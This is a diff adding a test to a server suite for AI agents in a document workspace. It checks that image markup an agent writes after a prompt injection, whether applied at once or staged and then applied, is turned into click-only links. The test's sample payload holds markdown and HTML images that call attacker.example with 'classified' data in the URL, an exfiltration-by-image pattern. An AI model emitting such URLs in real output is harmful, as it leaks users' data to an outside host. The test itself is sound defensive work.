@@ -372,6 +372,38 @@ describe('custom agents on the server', () => {
     assert.equal(((await apiRow.json()) as { title: string }).title, 'Agent task')
   })
 
+  test('web images: what an agent writes — at once or staged and applied here — never becomes an image the browser loads from the web', async () => {
+    meta.doc.transact(() => {
+      agentsMap().set('ag-pix-apply', agentDef('ag-pix-apply', 'Pixel applier', { write: 'apply' }))
+      agentsMap().set('ag-pix-stage', agentDef('ag-pix-stage', 'Pixel stager', { write: 'stage' }))
+    })
+    await flushed(meta)
+    // text the agent read told it to "include this image" with what it read in the address
+    const pixel = 'Summary\n\n![status](https://attacker.example/p.png?q=classified)\n\n<img src="https://attacker.example/i.png">\n\n[![badge](https://attacker.example/b.svg)](https://example.com)'
+    const script = (call: [string, Record<string, unknown>]) => (req: FakeRequest) => (toolResults(req).length ? say('Done.') : tools(call))
+    fake.script('Pixel applier', script(['create_page', { title: 'Pixel report', parent_id: 'area-1', markdown: pixel }]))
+    fake.script('Pixel stager', script(['create_page', { title: 'Pixel staged', parent_id: 'area-1', markdown: pixel }]))
+    const content = async (title: string) => {
+      await waitFor(() => [...pages().values()].some((p: any) => p.get('title') === title), 5000, `${title} arrives`)
+      const id = [...pages().entries()].find(([, p]: any) => p.get('title') === title)![0]
+      const d = await doc(owner, `ws:${wsId}:p:${id}`)
+      await waitFor(() => fragmentText(d.doc).includes('Summary'), 5000, 'content arrives')
+      return fragmentText(d.doc)
+    }
+
+    assert.equal((await member.post(`/api/workspaces/${wsId}/agents/ag-pix-apply/run`)).status, 202)
+    assert.equal((await finished('ag-pix-apply'))[0].status, 'ok')
+    const direct = await content('Pixel report')
+    assert.doesNotMatch(direct, /<image/, direct)
+    assert.match(direct, /<link href="https:\/\/attacker\.example\/p\.png\?q=classified">status<\/link>/, 'a link, followed only when clicked')
+
+    assert.equal((await member.post(`/api/workspaces/${wsId}/agents/ag-pix-stage/run`)).status, 202)
+    const [staged] = await finished('ag-pix-stage')
+    assert.equal((await member.post(`/api/workspaces/${wsId}/agent-runs/${staged.id}/apply`, {})).status, 200)
+    const applied = await content('Pixel staged')
+    assert.doesNotMatch(applied, /<image/, applied)
+  })
+
   test('scope: outside pages are refused; private pages, trash and templates are invisible; read-only agents get read tools only', async () => {
     fake.script('Scoped', (_req, n) =>
       n === 0
